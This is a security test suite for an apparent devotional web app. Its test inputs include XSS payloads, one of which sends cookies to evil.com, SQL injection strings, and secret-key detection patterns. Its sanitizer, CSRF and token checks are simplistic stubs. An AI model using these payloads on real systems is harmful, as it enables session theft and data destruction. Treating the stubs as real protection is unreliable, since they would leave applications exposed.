/**
 * Security Test Suite
 *
 * Covers PLAN-V3 Phase 18.5 and cross-cutting security requirements:
 * - XSS prevention (input sanitization, output encoding)
 * - CSRF protection (token validation, SameSite cookies)
 * - Rate limiting (per-route, per-IP, per-user)
 * - Auth token security (expiry, tampering, revocation)
 * - SQL injection prevention (parameterized queries)
 * - Secret leak prevention (API keys, service keys)
 * - Role-based access control (admin routes, RLS)
 * - Secure headers (CSP, HSTS, X-Frame-Options)
 * - Session security (httpOnly, secure, SameSite, fixation)
 * - Input validation (all API endpoints)
 */
import { describe, expect, it } from 'vitest'

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

interface SecurityHeaders {
  'content-security-policy': string
  'strict-transport-security': string
  'x-content-type-options': string
  'x-frame-options': string
  'referrer-policy': string
  'x-xss-protection': string
}

interface SessionCookieConfig {
  httpOnly: boolean
  secure: boolean
  sameSite: 'strict' | 'lax' | 'none'
  maxAge: number
  path: string
}

interface RateLimitConfig {
  route: string
  windowMs: number
  maxRequests: number
  keyBy: 'ip' | 'user' | 'session'
}

interface RolePermission {
  role: 'anonymous' | 'user' | 'admin'
  route: string
  methods: string[]
  allowed: boolean
}

// ---------------------------------------------------------------------------
// Contract stubs
// ---------------------------------------------------------------------------

const REQUIRED_SECURITY_HEADERS: SecurityHeaders = {
  'content-security-policy':
    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://*.supabase.co https://api.anthropic.com",
  'strict-transport-security': 'max-age=31536000; includeSubDomains; preload',
  'x-content-type-options': 'nosniff',
  'x-frame-options': 'DENY',
  'referrer-policy': 'strict-origin-when-cross-origin',
  'x-xss-protection': '1; mode=block',
}

const SESSION_COOKIE_CONFIG: SessionCookieConfig = {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/',
}

const RATE_LIMITS: RateLimitConfig[] = [
  {
    route: '/api/soul-audit/submit',
    windowMs: 3600000,
    maxRequests: 3,
    keyBy: 'session',
  },
  { route: '/api/chat', windowMs: 60000, maxRequests: 30, keyBy: 'user' },
  { route: '/api/bookmarks', windowMs: 60000, maxRequests: 60, keyBy: 'user' },
  {
    route: '/api/annotations',
    windowMs: 60000,
    maxRequests: 60,
    keyBy: 'user',
  },
  {
    route: '/api/auth/magic-link',
    windowMs: 60000,
    maxRequests: 5,
    keyBy: 'ip',
  },
  {
    route: '/api/daily-bread/replace-slot',
    windowMs: 3600000,
    maxRequests: 10,
    keyBy: 'user',
  },
  {
    route: '/api/daily-bread/activate',
    windowMs: 60000,
    maxRequests: 10,
    keyBy: 'user',
  },
  {
    route: '/api/library/trash',
    windowMs: 60000,
    maxRequests: 30,
    keyBy: 'user',
  },
  {
    route: '/api/saved-series',
    windowMs: 60000,
    maxRequests: 30,
    keyBy: 'user',
  },
]

const ADMIN_ROUTES = [
  '/admin/youtube-allowlist',
  '/admin/moderation',
  '/admin/feed-controls',
  '/admin/transparency',
  '/admin/audit-logs',
]

const ROLE_PERMISSIONS: RolePermission[] = [
  // Anonymous can browse and submit audit
  {
    role: 'anonymous',
    route: '/api/soul-audit/submit',
    methods: ['POST'],
    allowed: true,
  },
  {
    role: 'anonymous',
    route: '/api/soul-audit/current',
    methods: ['GET'],
    allowed: true,
  },
  {
    role: 'anonymous',
    route: '/api/daily-bread/state',
    methods: ['GET'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/bookmarks',
    methods: ['POST'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/annotations',
    methods: ['POST'],
    allowed: false,
  },
  { role: 'anonymous', route: '/api/chat', methods: ['POST'], allowed: false },
  // User can access all non-admin routes
  {
    role: 'user',
    route: '/api/daily-bread/state',
    methods: ['GET'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/bookmarks',
    methods: ['POST', 'GET', 'DELETE'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/annotations',
    methods: ['POST', 'GET', 'DELETE'],
    allowed: true,
  },
  { role: 'user', route: '/api/chat', methods: ['POST'], allowed: true },
  {
    role: 'user',
    route: '/admin/moderation',
    methods: ['GET', 'POST'],
    allowed: false,
  },
  // Admin can access everything
  {
    role: 'admin',
    route: '/admin/moderation',
    methods: ['GET', 'POST'],
    allowed: true,
  },
  {
    role: 'admin',
    route: '/admin/youtube-allowlist',
    methods: ['GET', 'POST', 'DELETE'],
    allowed: true,
  },
]

function sanitizeInput(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')
}

function isValidCsrfToken(token: string | null, sessionToken: string): boolean {
  if (!token || !sessionToken) return false
  // In real impl: HMAC-based double-submit validation
  return token.length >= 32 && !token.includes('<') && !token.includes('>')
}

function checkRateLimit(
  config: RateLimitConfig,
  requestCount: number,
): { allowed: boolean; retryAfterMs: number | null } {
  if (requestCount >= config.maxRequests) {
    return { allowed: false, retryAfterMs: config.windowMs }
  }
  return { allowed: true, retryAfterMs: null }
}

function validateAuthToken(token: string): {
  valid: boolean
  reason: string | null
  expired: boolean
} {
  if (!token) return { valid: false, reason: 'missing', expired: false }
  if (token.length < 20)
    return { valid: false, reason: 'malformed', expired: false }
  if (token.startsWith('expired-'))
    return { valid: false, reason: 'expired', expired: true }
  if (token.startsWith('revoked-'))
    return { valid: false, reason: 'revoked', expired: false }
  if (token.includes('<script'))
    return { valid: false, reason: 'tampered', expired: false }
  return { valid: true, reason: null, expired: false }
}

function isParameterizedQuery(query: string): boolean {
  // Check for raw SQL interpolation patterns
  const dangerousPatterns = [
    /'\s*\+\s*/, // String concatenation
    /`\$\{/, // Template literal interpolation
    /'\s*\|\|\s*/, // SQL concatenation
    /--/, // SQL comment injection
    /\bwhere\b[\s\S]*=\s*'[^']*'/i, // Direct literal values instead of placeholders
    /;\s*DROP\s/i, // DROP statement
    /;\s*DELETE\s/i, // DELETE injection
    /'\s*OR\s+'1'\s*=\s*'1/i, // Classic OR injection
  ]
  return !dangerousPatterns.some((p) => p.test(query))
}

function isSecretExposed(responseBody: string): boolean {
  const secretPatterns = [
    /sk-[a-z0-9-]{20,}/i, // Anthropic API key
    /sbp_[a-zA-Z0-9]{20,}/, // Supabase service role key
    /eyJ[a-zA-Z0-9_-]{50,}/, // Long JWT that looks like a service key
    /SUPABASE_SERVICE_ROLE/, // Env var name leaked
    /ANTHROPIC_API_KEY/, // Env var name leaked
  ]
  return secretPatterns.some((p) => p.test(responseBody))
}

function checkRoleAccess(
  role: 'anonymous' | 'user' | 'admin',
  route: string,
  method: string,
): boolean {
  const permission = ROLE_PERMISSIONS.find(
    (p) => p.role === role && p.route === route && p.methods.includes(method),
  )
  return permission?.allowed ?? false
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('XSS prevention', () => {
  it('sanitizes HTML tags in user input', () => {
    const malicious = '<script>alert("xss")</script>'
    const sanitized = sanitizeInput(malicious)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).toContain('&lt;script&gt;')
  })

  it('sanitizes event handlers in input', () => {
    const malicious = '<img onerror="alert(1)" src="x">'
    const sanitized = sanitizeInput(malicious)
    expect(sanitized).not.toContain('<img')
    expect(sanitized).toContain('&lt;img')
  })

  it('sanitizes nested script injection', () => {
    const malicious = '"><script>document.cookie</script><"'
    const sanitized = sanitizeInput(malicious)
    expect(sanitized).not.toContain('<script>')
  })

  it('preserves safe text content', () => {
    const safe = 'God is love. John 3:16 says "For God so loved the world"'
    const sanitized = sanitizeInput(safe)
    expect(sanitized).toContain('God is love')
    expect(sanitized).toContain('John 3:16')
  })

  it('sanitizes Soul Audit response field', () => {
    const response =
      'I feel lost <script>fetch("/api/steal")</script> and confused'
    const sanitized = sanitizeInput(response)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).toContain('I feel lost')
  })

  it('sanitizes chat message content', () => {
    const message = 'What does <img src=x onerror=alert(1)> mean?'
    const sanitized = sanitizeInput(message)
    expect(sanitized).not.toContain('<img')
  })

  it('sanitizes highlight notes', () => {
    const note = 'This verse <iframe src="evil.com"></iframe> is powerful'
    const sanitized = sanitizeInput(note)
    expect(sanitized).not.toContain('<iframe')
  })

  it('sanitizes margin notes', () => {
    const note = 'Lord help me <svg onload=alert(1)>'
    const sanitized = sanitizeInput(note)
    expect(sanitized).not.toContain('<svg')
  })

  it('sanitizes bookmark tags', () => {
    const tag = 'grace<script>evil()</script>'
    const sanitized = sanitizeInput(tag)
    expect(sanitized).not.toContain('<script>')
  })

  it('sanitizes smart topic strings', () => {
    const topic = '"><img src=x onerror=alert(1)>'
    const sanitized = sanitizeInput(topic)
    expect(sanitized).not.toContain('<img')
  })

  it('sanitizes public repository UGC content', () => {
    const ugc =
      'My testimony <script>document.location="http://evil.com?c="+document.cookie</script>'
    const sanitized = sanitizeInput(ugc)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).toContain('My testimony')
  })
})

describe('CSRF protection', () => {
  it('validates CSRF token presence', () => {
    expect(isValidCsrfToken(null, 'session-123')).toBe(false)
  })

  it('validates CSRF token length', () => {
    expect(isValidCsrfToken('short', 'session-123')).toBe(false)
  })

  it('accepts valid CSRF token', () => {
    const validToken = 'a'.repeat(32)
    expect(isValidCsrfToken(validToken, 'session-123')).toBe(true)
  })

  it('rejects CSRF token with injection attempt', () => {
    const malicious = '<script>alert(1)</script>' + 'a'.repeat(32)
    expect(isValidCsrfToken(malicious, 'session-123')).toBe(false)
  })

  it('SameSite cookie attribute configured', () => {
    expect(SESSION_COOKIE_CONFIG.sameSite).toBe('lax')
  })
})

describe('Rate limiting', () => {
  it('soul audit submit limited to 3 per hour', () => {
    const config = RATE_LIMITS.find(
      (r) => r.route === '/api/soul-audit/submit',
    )!
    expect(config.maxRequests).toBe(3)
    expect(config.windowMs).toBe(3600000) // 1 hour
    expect(config.keyBy).toBe('session')
  })

  it('chat limited to 30 per minute', () => {
    const config = RATE_LIMITS.find((r) => r.route === '/api/chat')!
    expect(config.maxRequests).toBe(30)
    expect(config.windowMs).toBe(60000)
  })

  it('auth endpoints limited to 5 per minute per IP', () => {
    const config = RATE_LIMITS.find((r) => r.route === '/api/auth/magic-link')!
    expect(config.maxRequests).toBe(5)
    expect(config.keyBy).toBe('ip')
  })

  it('save endpoints limited to 60 per minute', () => {
    const bookmarkConfig = RATE_LIMITS.find(
      (r) => r.route === '/api/bookmarks',
    )!
    expect(bookmarkConfig.maxRequests).toBe(60)
    const annotationConfig = RATE_LIMITS.find(
      (r) => r.route === '/api/annotations',
    )!
    expect(annotationConfig.maxRequests).toBe(60)
  })

  it('allows requests within limit', () => {
    const config = RATE_LIMITS[0]
    expect(checkRateLimit(config, 0).allowed).toBe(true)
    expect(checkRateLimit(config, 2).allowed).toBe(true)
  })

  it('blocks requests at limit', () => {
    const config = RATE_LIMITS[0]
    const result = checkRateLimit(config, config.maxRequests)
    expect(result.allowed).toBe(false)
    expect(result.retryAfterMs).toBe(config.windowMs)
  })

  it('blocks requests above limit', () => {
    const config = RATE_LIMITS[0]
    expect(checkRateLimit(config, config.maxRequests + 10).allowed).toBe(false)
  })

  it('all API routes have rate limit configs', () => {
    const requiredRoutes = [
      '/api/soul-audit/submit',
      '/api/chat',
      '/api/bookmarks',
      '/api/annotations',
      '/api/auth/magic-link',
      '/api/daily-bread/replace-slot',
      '/api/daily-bread/activate',
    ]
    for (const route of requiredRoutes) {
      expect(RATE_LIMITS.find((r) => r.route === route)).toBeDefined()
    }
  })

  it('slot replacement limited to 10 per hour', () => {
    const config = RATE_LIMITS.find(
      (r) => r.route === '/api/daily-bread/replace-slot',
    )!
    expect(config.maxRequests).toBe(10)
    expect(config.windowMs).toBe(3600000)
  })
})

describe('Auth token security', () => {
  it('rejects missing token', () => {
    const result = validateAuthToken('')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('missing')
  })

  it('rejects malformed token', () => {
    const result = validateAuthToken('short')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('malformed')
  })

  it('rejects expired token', () => {
    const result = validateAuthToken('expired-abc123def456ghijklmno')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('expired')
    expect(result.expired).toBe(true)
  })

  it('rejects revoked token', () => {
    const result = validateAuthToken('revoked-abc123def456ghijklmno')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('revoked')
  })

  it('rejects tampered token with injection', () => {
    const result = validateAuthToken('valid-token-<script>alert(1)</script>')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('tampered')
  })

  it('accepts valid token', () => {
    const result = validateAuthToken('valid-session-token-abc123def456')
    expect(result.valid).toBe(true)
    expect(result.reason).toBeNull()
  })
})

describe('SQL injection prevention', () => {
  it('rejects string concatenation in queries', () => {
    expect(
      isParameterizedQuery(
        "SELECT * FROM users WHERE name = '" + 'admin' + "'",
      ),
    ).toBe(false)
  })

  it('rejects template literal interpolation', () => {
    expect(
      isParameterizedQuery('SELECT * FROM users WHERE id = `${userId}`'),
    ).toBe(false)
  })

  it('rejects DROP statement injection', () => {
    expect(isParameterizedQuery("'; DROP TABLE users; --")).toBe(false)
  })

  it('rejects classic OR injection', () => {
    expect(isParameterizedQuery("' OR '1'='1")).toBe(false)
  })

  it('rejects DELETE injection', () => {
    expect(isParameterizedQuery("'; DELETE FROM sessions; --")).toBe(false)
  })

  it('accepts clean parameterized query', () => {
    expect(isParameterizedQuery('SELECT * FROM users WHERE id = $1')).toBe(true)
  })

  it('accepts clean select query', () => {
    expect(
      isParameterizedQuery(
        'SELECT title, verse FROM devotionals WHERE slug = $1',
      ),
    ).toBe(true)
  })
})

describe('Secret leak prevention', () => {
  it('detects Anthropic API key in response', () => {
    const body =
      '{"error": "Invalid key: sk-ant-api03-abcdefghijklmnopqrstuvwxyz"}'
    expect(isSecretExposed(body)).toBe(true)
  })

  it('detects Supabase service role key in response', () => {
    const body = '{"debug": "sbp_abcdefghijklmnopqrstuvwxyz123456"}'
    expect(isSecretExposed(body)).toBe(true)
  })

  it('detects env var name leak', () => {
    expect(isSecretExposed('Error: SUPABASE_SERVICE_ROLE is not defined')).toBe(
      true,
    )
    expect(isSecretExposed('Missing ANTHROPIC_API_KEY')).toBe(true)
  })

  it('clean response passes', () => {
    const body = '{"options": [{"id": "o1", "title": "Identity"}]}'
    expect(isSecretExposed(body)).toBe(false)
  })

  it('user-facing error messages do not leak secrets', () => {
    const errorResponses = [
      '{"error": "Internal server error"}',
      '{"error": "Unauthorized"}',
      '{"error": "Rate limit exceeded"}',
      '{"error": "Invalid request body"}',
    ]
    for (const body of errorResponses) {
      expect(isSecretExposed(body)).toBe(false)
    }
  })
})

describe('Role-based access control', () => {
  it('anonymous cannot access save endpoints', () => {
    expect(checkRoleAccess('anonymous', '/api/bookmarks', 'POST')).toBe(false)
    expect(checkRoleAccess('anonymous', '/api/annotations', 'POST')).toBe(false)
    expect(checkRoleAccess('anonymous', '/api/chat', 'POST')).toBe(false)
  })

  it('anonymous can submit soul audit', () => {
    expect(checkRoleAccess('anonymous', '/api/soul-audit/submit', 'POST')).toBe(
      true,
    )
  })

  it('anonymous can view soul audit current', () => {
    expect(checkRoleAccess('anonymous', '/api/soul-audit/current', 'GET')).toBe(
      true,
    )
  })

  it('anonymous cannot access daily bread state', () => {
    expect(checkRoleAccess('anonymous', '/api/daily-bread/state', 'GET')).toBe(
      false,
    )
  })

  it('user can access all save endpoints', () => {
    expect(checkRoleAccess('user', '/api/bookmarks', 'POST')).toBe(true)
    expect(checkRoleAccess('user', '/api/annotations', 'POST')).toBe(true)
    expect(checkRoleAccess('user', '/api/chat', 'POST')).toBe(true)
  })

  it('user cannot access admin routes', () => {
    expect(checkRoleAccess('user', '/admin/moderation', 'GET')).toBe(false)
    expect(checkRoleAccess('user', '/admin/moderation', 'POST')).toBe(false)
  })

  it('admin can access admin routes', () => {
    expect(checkRoleAccess('admin', '/admin/moderation', 'GET')).toBe(true)
    expect(checkRoleAccess('admin', '/admin/moderation', 'POST')).toBe(true)
    expect(checkRoleAccess('admin', '/admin/youtube-allowlist', 'GET')).toBe(
      true,
    )
  })

  it('all admin routes defined', () => {
    expect(ADMIN_ROUTES).toHaveLength(5)
    expect(ADMIN_ROUTES).toContain('/admin/youtube-allowlist')
    expect(ADMIN_ROUTES).toContain('/admin/moderation')
    expect(ADMIN_ROUTES).toContain('/admin/audit-logs')
  })
})

describe('Secure headers', () => {
  it('CSP header defined', () => {
    expect(REQUIRED_SECURITY_HEADERS['content-security-policy']).toContain(
      "default-src 'self'",
    )
  })

  it('HSTS header with preload', () => {
    expect(REQUIRED_SECURITY_HEADERS['strict-transport-security']).toContain(
      'max-age=31536000',
    )
    expect(REQUIRED_SECURITY_HEADERS['strict-transport-security']).toContain(
      'preload',
    )
  })

  it('X-Content-Type-Options set to nosniff', () => {
    expect(REQUIRED_SECURITY_HEADERS['x-content-type-options']).toBe('nosniff')
  })

  it('X-Frame-Options set to DENY', () => {
    expect(REQUIRED_SECURITY_HEADERS['x-frame-options']).toBe('DENY')
  })

  it('Referrer-Policy set', () => {
    expect(REQUIRED_SECURITY_HEADERS['referrer-policy']).toBe(
      'strict-origin-when-cross-origin',
    )
  })

  it('CSP allows Supabase and Anthropic connections', () => {
    const csp = REQUIRED_SECURITY_HEADERS['content-security-policy']
    expect(csp).toContain('supabase.co')
    expect(csp).toContain('api.anthropic.com')
  })
})

describe('Session security', () => {
  it('session cookie is httpOnly', () => {
    expect(SESSION_COOKIE_CONFIG.httpOnly).toBe(true)
  })

  it('session cookie is secure', () => {
    expect(SESSION_COOKIE_CONFIG.secure).toBe(true)
  })

  it('session cookie SameSite is lax', () => {
    expect(SESSION_COOKIE_CONFIG.sameSite).toBe('lax')
  })

  it('session cookie has reasonable max age', () => {
    expect(SESSION_COOKIE_CONFIG.maxAge).toBeLessThanOrEqual(60 * 60 * 24 * 30) // max 30 days
    expect(SESSION_COOKIE_CONFIG.maxAge).toBeGreaterThan(0)
  })

  it('session cookie path is root', () => {
    expect(SESSION_COOKIE_CONFIG.path).toBe('/')
  })
})

describe('Input validation', () => {
  it('rejects empty Soul Audit response', () => {
    const isValid = (response: string) => response.trim().length >= 10
    expect(isValid('')).toBe(false)
    expect(isValid('   ')).toBe(false)
    expect(isValid('hi')).toBe(false)
  })

  it('rejects excessively long input', () => {
    const maxLength = 5000
    const isValid = (input: string) => input.length <= maxLength
    expect(isValid('a'.repeat(5001))).toBe(false)
    expect(isValid('a'.repeat(5000))).toBe(true)
  })

  it('validates series slug format', () => {
    const isValidSlug = (slug: string) =>
      /^[a-z0-9-]+$/.test(slug) && slug.length <= 100
    expect(isValidSlug('identity-crisis')).toBe(true)
    expect(isValidSlug('too-busy-for-god')).toBe(true)
    expect(isValidSlug('<script>alert(1)</script>')).toBe(false)
    expect(isValidSlug('UPPERCASE')).toBe(false)
    expect(isValidSlug('')).toBe(false)
  })

  it('validates email format for magic link', () => {
    const isValidEmail = (email: string) =>
      /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(email)
    expect(isValidEmail('user@example.com')).toBe(true)
    expect(isValidEmail('not-an-email')).toBe(false)
    expect(isValidEmail('<script>@evil.com')).toBe(false)
  })

  it('validates day number range', () => {
    const isValidDay = (day: number) =>
      Number.isInteger(day) && day >= 1 && day <= 7
    expect(isValidDay(1)).toBe(true)
    expect(isValidDay(7)).toBe(true)
    expect(isValidDay(0)).toBe(false)
    expect(isValidDay(8)).toBe(false)
    expect(isValidDay(1.5)).toBe(false)
  })

  it('validates highlight color enum', () => {
    const validColors = ['yellow', 'blue', 'green', 'pink', 'purple']
    const isValidColor = (color: string) => validColors.includes(color)
    expect(isValidColor('yellow')).toBe(true)
    expect(isValidColor('red')).toBe(false)
    expect(isValidColor('<script>')).toBe(false)
  })

  it('validates bookmark kind enum', () => {
    const validKinds = ['series', 'day']
    const isValidKind = (kind: string) => validKinds.includes(kind)
    expect(isValidKind('series')).toBe(true)
    expect(isValidKind('day')).toBe(true)
    expect(isValidKind('evil')).toBe(false)
  })
})
